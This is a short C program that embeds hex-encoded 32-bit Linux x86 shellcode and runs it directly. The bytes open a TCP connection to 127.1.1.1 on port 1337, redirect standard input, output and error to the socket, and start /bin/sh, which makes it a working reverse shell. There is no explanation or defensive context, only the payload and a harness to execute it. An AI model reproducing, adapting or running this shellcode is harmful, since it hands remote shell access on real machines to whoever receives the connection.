#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
"\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68"
"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
"\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
"\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}